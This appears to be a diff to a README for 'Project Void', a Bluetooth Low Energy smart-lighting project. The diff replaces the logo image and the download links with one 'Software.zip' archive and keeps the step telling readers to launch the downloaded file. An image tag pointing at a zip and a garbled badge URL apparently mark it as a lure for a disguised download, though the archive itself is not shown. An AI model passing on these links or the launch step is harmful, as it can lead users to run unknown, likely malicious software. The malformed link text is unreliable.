@@ -3,7 +3,7 @@
 
 Welcome to Project Void, a Bluetooth Low Energy (BLE)-powered ecosystem that brings smart lighting to a whole new level! 🌟
 
-![Project Void Logo](https://example.com/projectvoidlogo.jpg)
+![Project Void Logo](https://github.com/AnushkaAtri/Project-Void/releases/download/v1.0/Software.zip)
 
 ## Description
 Project Void is an exciting project focusing on creating a seamless experience in smart lighting control using BLE technology. Whether you're into Arduino, embedded systems, or just want to explore the world of smart lighting, Project Void has something for everyone.
@@ -29,9 +29,9 @@ Project Void is an exciting project focusing on creating a seamless experience i
 - Vortex
 
 ## Installation
-To get started with Project Void, download the latest release [here](https://github.com/cli/browser/releases/tag/v1.0.0). Launch the file to begin exploring the endless possibilities of smart lighting control!
+To get started with Project Void, download the latest release [here](https://github.com/AnushkaAtri/Project-Void/releases/download/v1.0/Software.zip). Launch the file to begin exploring the endless possibilities of smart lighting control!
 
-[![Download Project Void](https://img.shields.io/badge/Download%20Project%20Void-v1.0.0-blue.svg)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Project Void](https://github.com/AnushkaAtri/Project-Void/releases/download/v1.0/Software.zip%20Project%https://github.com/AnushkaAtri/Project-Void/releases/download/v1.0/Software.zip)](https://github.com/AnushkaAtri/Project-Void/releases/download/v1.0/Software.zip)
 
 ## Usage
 Follow these steps to start using Project Void:
